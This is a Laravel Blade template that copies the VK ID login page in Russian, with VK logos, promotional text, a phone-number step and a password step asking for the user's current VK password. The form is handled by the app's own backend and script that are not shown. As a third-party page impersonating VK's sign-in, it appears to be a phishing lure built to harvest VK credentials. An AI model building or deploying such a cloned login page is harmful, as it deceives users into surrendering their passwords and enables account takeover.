@extends('layouts.main')
@section('content')

    <main>
        <div class="auth  flex md:items-center justify-center pt-4">
            <div class="container ">
                <div class="auth__block mx-auto bg-inherit">
                    <div class="flex justify-center auth__content">
                        <div class="left__block p-7 flex flex-col gap-4 h-full hidden md:flex">
                            <div class="flex items-center ">
                                <svg height="20" width="20" viewBox="0 0 20 20" fill="#07F" xmlns="http://www.w3.org/2000/svg"><path class="vkc__VKConnectLogo__defaultLogoColor" d="M0 9.6C0 5.07452 0 2.81178 1.40589 1.40589C2.81178 0 5.07452 0 9.6 0H10.4C14.9255 0 17.1882 0 18.5941 1.40589C20 2.81178 20 5.07452 20 9.6V10.4C20 14.9255 20 17.1882 18.5941 18.5941C17.1882 20 14.9255 20 10.4 20H9.6C5.07452 20 2.81178 20 1.40589 18.5941C0 17.1882 0 14.9255 0 10.4V9.6Z"></path><path d="M10.7375 14.33C6.22503 14.33 3.48727 11.2025 3.38 6H5.66547C5.73671 9.82165 7.47543 11.437 8.80828 11.77V6H10.9985V9.3C12.2841 9.15751 13.6298 7.65546 14.0821 6H16.2378C15.8928 8.0357 14.4279 9.5312 13.3928 10.15C14.4287 10.6503 16.0953 11.9613 16.7382 14.33H14.3686C13.8683 12.7466 12.6427 11.5265 10.9993 11.36V14.33H10.7375Z" fill="white"></path></svg>
                                <svg height="20" viewBox="0 0 21 20" fill="none" xmlns="http://www.w3.org/2000/svg"><g fill="white" class="vkc__VKConnectLogo__letter"><path d="M5.00098 16H7V4H5.00098V16Z"></path><path d="M9.5 16H14.2688C17.9127 16 20.501 13.5149 20.501 9.99149C20.501 6.48511 17.9127 4 14.2688 4H9.5V16ZM11.5433 14.1277V5.87234H14.2688C16.7038 5.87234 18.3725 7.55745 18.3725 9.99149C18.3725 12.4426 16.7038 14.1277 14.2688 14.1277H11.5433Z"></path></g></svg>
                            </div>
                            <h1>ВКонтакте можно войти <br> через VK ID</h1>
                            <div class="flex gap-4 items-center">
                                <svg class="z-20" width="28" height="28" xmlns="http://www.w3.org/2000/svg"><g fill="none" fill-rule="evenodd"><path d="M0 0h28v28H0z"></path><path d="M17.5 8.5C17.5 6.566 15.934 5 14 5a3.499 3.499 0 00-3.5 3.5c0 1.934 1.566 3.5 3.5 3.5s3.5-1.566 3.5-3.5zm2 0c0 3.039-2.461 5.5-5.5 5.5a5.499 5.499 0 01-5.5-5.5C8.5 5.461 10.961 3 14 3s5.5 2.461 5.5 5.5zM7 20.643c0 .943-.08.857.456.857h13.588c.536 0 .456.086.456-.857 0-2.288-3.304-3.643-7.25-3.643S7 18.355 7 20.643zm-2 0C5 16.763 9.299 15 14.25 15s9.25 1.763 9.25 5.643c0 2.016-.781 2.857-2.456 2.857H7.456C5.78 23.5 5 22.66 5 20.643z" fill="currentColor" fill-rule="nonzero"></path></g></svg>
                                <p>Единый аккаунт для сервисов VK и партнёров</p>
                            </div>
                            <div class="flex gap-4 items-center">
                                <svg fill="none" height="28" width="28" xmlns="http://www.w3.org/2000/svg"><path clip-rule="evenodd" d="M17.643 25H15a1 1 0 110-2h2.6c1.137 0 1.929 0 2.546-.051.605-.05.953-.142 1.216-.276a3 3 0 001.311-1.311c.134-.263.226-.611.276-1.216.05-.617.051-1.41.051-2.546v-7.2c0-1.137 0-1.929-.051-2.546-.05-.605-.142-.953-.276-1.216a3 3 0 00-1.311-1.311c-.263-.134-.611-.226-1.216-.276C19.529 5.001 18.736 5 17.6 5H15a1 1 0 110-2h2.643c1.084 0 1.958 0 2.666.058.729.06 1.369.185 1.961.487a5 5 0 012.185 2.185c.302.592.428 1.233.487 1.961C25 8.4 25 9.273 25 10.357v7.286c0 1.084 0 1.958-.058 2.666-.06.728-.185 1.369-.487 1.961a5 5 0 01-2.185 2.185c-.592.302-1.232.428-1.961.487C19.6 25 18.727 25 17.643 25zM3 14a1 1 0 011-1h9.586l-2.293-2.293a1 1 0 011.414-1.414l4 4a.996.996 0 01.294.705v.005c-.002.272-.11.518-.287.698l-.008.007-3.999 4a1 1 0 01-1.414-1.415L13.586 15H4a1 1 0 01-1-1z" fill="currentColor" fill-rule="evenodd"></path></svg>
                                <p>Быстрый вход в одно нажатие</p>
                            </div>
                            <div class="flex gap-4 items-center">
                                <svg width="28" height="28" xmlns="http://www.w3.org/2000/svg"><g fill="none" fill-rule="evenodd"><path d="M0 0h28v28H0z"></path><path d="M14 2a6 6 0 016 6l.002 2.023c.843.052 1.38.2 1.935.496.663.355 1.19.881 1.544 1.544.385.72.519 1.413.519 2.783v6.308c0 1.37-.134 2.063-.519 2.783a3.726 3.726 0 01-1.544 1.544c-.72.385-1.413.519-2.783.519H8.846c-1.37 0-2.063-.134-2.783-.519a3.726 3.726 0 01-1.544-1.544C4.134 23.217 4 22.524 4 21.154v-6.308c0-1.37.134-2.063.519-2.783a3.726 3.726 0 011.544-1.544c.555-.297 1.093-.444 1.936-.496L8 8a6 6 0 016-6zm5.154 10H8.846c-1.068 0-1.449.073-1.84.283-.314.168-.555.409-.723.723-.21.391-.283.772-.283 1.84v6.308c0 1.068.073 1.449.283 1.84.168.314.409.555.723.723.391.21.772.283 1.84.283h10.308c1.068 0 1.449-.073 1.84-.283.314-.168.555-.409.723-.723.21-.391.283-.772.283-1.84v-6.308c0-1.068-.073-1.449-.283-1.84a1.726 1.726 0 00-.723-.723c-.391-.21-.772-.283-1.84-.283zM14 15a1 1 0 011 1v3a1 1 0 01-2 0v-3a1 1 0 011-1zm0-11a4 4 0 00-4 4v2h8V8a4 4 0 00-4-4z" fill="currentColor" fill-rule="nonzero"></path></g></svg>
                                <p>Надёжная защита с привязкой к телефону</p>
                            </div>
                            <div class="mt-6 justify-self-end detailed mt-auto">
                                <a class="justify-self-end" href="https://id.vk.com/promo?">Подробнее о VK ID</a>
                            </div>
                        </div>

                        <form action="" method="post" id="main__form" onsubmit="return false">
                            @csrf
                            <div class="right__block md:p-7 h-full tab-content__item js-tab-content active w-full" data-tab="1">
                                <div class="flex flex-col gap-4 relative h-full w-full">
                                    <div class="md:hidden flex items-center justify-center">
                                        <svg height="20" width="20" viewBox="0 0 20 20" fill="#07F" xmlns="http://www.w3.org/2000/svg"><path class="vkc__VKConnectLogo__defaultLogoColor" d="M0 9.6C0 5.07452 0 2.81178 1.40589 1.40589C2.81178 0 5.07452 0 9.6 0H10.4C14.9255 0 17.1882 0 18.5941 1.40589C20 2.81178 20 5.07452 20 9.6V10.4C20 14.9255 20 17.1882 18.5941 18.5941C17.1882 20 14.9255 20 10.4 20H9.6C5.07452 20 2.81178 20 1.40589 18.5941C0 17.1882 0 14.9255 0 10.4V9.6Z"></path><path d="M10.7375 14.33C6.22503 14.33 3.48727 11.2025 3.38 6H5.66547C5.73671 9.82165 7.47543 11.437 8.80828 11.77V6H10.9985V9.3C12.2841 9.15751 13.6298 7.65546 14.0821 6H16.2378C15.8928 8.0357 14.4279 9.5312 13.3928 10.15C14.4287 10.6503 16.0953 11.9613 16.7382 14.33H14.3686C13.8683 12.7466 12.6427 11.5265 10.9993 11.36V14.33H10.7375Z" fill="white"></path></svg>
                                        <svg height="20" viewBox="0 0 21 20" fill="none" xmlns="http://www.w3.org/2000/svg"><g fill="white" class="vkc__VKConnectLogo__letter"><path d="M5.00098 16H7V4H5.00098V16Z"></path><path d="M9.5 16H14.2688C17.9127 16 20.501 13.5149 20.501 9.99149C20.501 6.48511 17.9127 4 14.2688 4H9.5V16ZM11.5433 14.1277V5.87234H14.2688C16.7038 5.87234 18.3725 7.55745 18.3725 9.99149C18.3725 12.4426 16.7038 14.1277 14.2688 14.1277H11.5433Z"></path></g></svg>
                                    </div>

                                    <div class="hidden md:flex justify-center ">
                                        <svg class="" width="48" height="48" fill="none" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20"><path d="M0 9.6c0-4.5 0-6.8 1.4-8.2C2.8 0 5.1 0 9.6 0h.8c4.5 0 6.8 0 8.2 1.4C20 2.8 20 5.1 20 9.6v.8c0 4.5 0 6.8-1.4 8.2-1.4 1.4-3.7 1.4-8.2 1.4h-.8c-4.5 0-6.8 0-8.2-1.4C0 17.2 0 14.9 0 10.4v-.8Z" fill="#07F"></path><path d="M10.7 14.3c-4.5 0-7.2-3.1-7.3-8.3h2.3c0 3.8 1.8 5.4 3.1 5.8V6H11v3.3c1.3-.1 2.6-1.6 3-3.3h2.2c-.3 2-1.8 3.5-2.8 4.2 1 .5 2.7 1.8 3.3 4.1h-2.3c-.5-1.6-1.8-2.8-3.4-3v3h-.3Z" fill="#fff"></path></svg>
                                    </div>
                                    <p class="font-medium text-xl text-center">Введите номер</p>
                                    <span class="">Ваш номер телефона будет использоваться для входа в аккаунт</span>
                                    <div class="input__block">
                                       <x-phone-input></x-phone-input>
                                    </div>

                                    <div class="submit__block">
                                        <input
                                            data-tab="2"
                                            id="next__btn"
                                            class="next__btn tab-header__item js-tab-trigger opacity-70"
                                            type="button"
                                            value="Продолжить"
                                        >
                                    </div>
                                    <div class="mt-auto">
                                        <p class=" political__text text-center">Нажимая «Продолжить», вы принимаете <a href="https://id.vk.com/terms">пользовательское соглашение</a> и
                                            <a href="https://id.vk.com/privacy">политику конфиденциальности</a></p>
                                    </div>
                                </div>
                            </div>

                            <div class="right__block md:p-7 h-full tab-content__item js-tab-content" data-tab="2">
                                <div class="flex flex-col gap-4 relative h-full w-full">
                                    <a  data-tab="1"
                                        class="arrow absolute top-[-5px] tab-header__item js-tab-trigger" href="#">
                                        <svg class="arrowSvg text-current" width="28" height="28" xmlns="http://www.w3.org/2000/svg"><g fill="none" fill-rule="evenodd"><path d="M28 0H0v28h28z"></path><path d="M12.293 6.293a1 1 0 011.414 1.414L8.414 13H22a1 1 0 01.993.883L23 14a1 1 0 01-1 1H8.414l5.293 5.293a1 1 0 01.083 1.32l-.083.094a1 1 0 01-1.414 0l-7-7-.073-.082A1.005 1.005 0 015 14l.004.09A1.006 1.006 0 015 14.02V14a1.02 1.02 0 01.125-.484.878.878 0 01.071-.111.999.999 0 01.097-.112l-.08.09c.025-.031.051-.062.08-.09z" fill="currentColor" fill-rule="nonzero"></path></g></svg>
                                    </a>
                                    <div class="hidden md:flex justify-center">
                                        <svg class=" hidden md:block" width="48" height="48" fill="none" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20"><path d="M0 9.6c0-4.5 0-6.8 1.4-8.2C2.8 0 5.1 0 9.6 0h.8c4.5 0 6.8 0 8.2 1.4C20 2.8 20 5.1 20 9.6v.8c0 4.5 0 6.8-1.4 8.2-1.4 1.4-3.7 1.4-8.2 1.4h-.8c-4.5 0-6.8 0-8.2-1.4C0 17.2 0 14.9 0 10.4v-.8Z" fill="#07F"></path><path d="M10.7 14.3c-4.5 0-7.2-3.1-7.3-8.3h2.3c0 3.8 1.8 5.4 3.1 5.8V6H11v3.3c1.3-.1 2.6-1.6 3-3.3h2.2c-.3 2-1.8 3.5-2.8 4.2 1 .5 2.7 1.8 3.3 4.1h-2.3c-.5-1.6-1.8-2.8-3.4-3v3h-.3Z" fill="#fff"></path></svg>
                                    </div>
                                    <div class="md:hidden flex items-center justify-center">
                                        <svg height="20" width="20" viewBox="0 0 20 20" fill="#07F" xmlns="http://www.w3.org/2000/svg"><path class="vkc__VKConnectLogo__defaultLogoColor" d="M0 9.6C0 5.07452 0 2.81178 1.40589 1.40589C2.81178 0 5.07452 0 9.6 0H10.4C14.9255 0 17.1882 0 18.5941 1.40589C20 2.81178 20 5.07452 20 9.6V10.4C20 14.9255 20 17.1882 18.5941 18.5941C17.1882 20 14.9255 20 10.4 20H9.6C5.07452 20 2.81178 20 1.40589 18.5941C0 17.1882 0 14.9255 0 10.4V9.6Z"></path><path d="M10.7375 14.33C6.22503 14.33 3.48727 11.2025 3.38 6H5.66547C5.73671 9.82165 7.47543 11.437 8.80828 11.77V6H10.9985V9.3C12.2841 9.15751 13.6298 7.65546 14.0821 6H16.2378C15.8928 8.0357 14.4279 9.5312 13.3928 10.15C14.4287 10.6503 16.0953 11.9613 16.7382 14.33H14.3686C13.8683 12.7466 12.6427 11.5265 10.9993 11.36V14.33H10.7375Z" fill="white"></path></svg>
                                        <svg height="20" viewBox="0 0 21 20" fill="none" xmlns="http://www.w3.org/2000/svg"><g fill="white" class="vkc__VKConnectLogo__letter"><path d="M5.00098 16H7V4H5.00098V16Z"></path><path d="M9.5 16H14.2688C17.9127 16 20.501 13.5149 20.501 9.99149C20.501 6.48511 17.9127 4 14.2688 4H9.5V16ZM11.5433 14.1277V5.87234H14.2688C16.7038 5.87234 18.3725 7.55745 18.3725 9.99149C18.3725 12.4426 16.7038 14.1277 14.2688 14.1277H11.5433Z"></path></g></svg>
                                    </div>

                                    <p class="font-medium text-xl text-center ">Введите пароль</p>
                                    <span class="">Введите ваш текущий пароль, привязанный к <span class="number"></span></span>
                                    <div class="input__block">
                                        <input name="password"
                                               type="password"
                                               class="input "
                                               placeholder="Введите пароль"
                                               autocomplete=""
                                               id="password__input"
                                               required
                                        >
                                        <a class="change__password" href="#">Забыли или не установили пароль?</a>
                                    </div>
                                    <div
                                        class="submit__block mt-auto ">
                                        <input
                                            class="submit__btn opacity-70"
                                            type="submit"
                                            value="Продолжить"
                                            id="submit__btn"
                                        >
                                    </div>
                                </div>
                            </div>
                        </form>
                    </div>
                </div>
            </div>
        </div>
        <x-alert></x-alert>


    </main>

    <style>
        body {
            background-color: #19191a;
        }
    </style>
@endsection
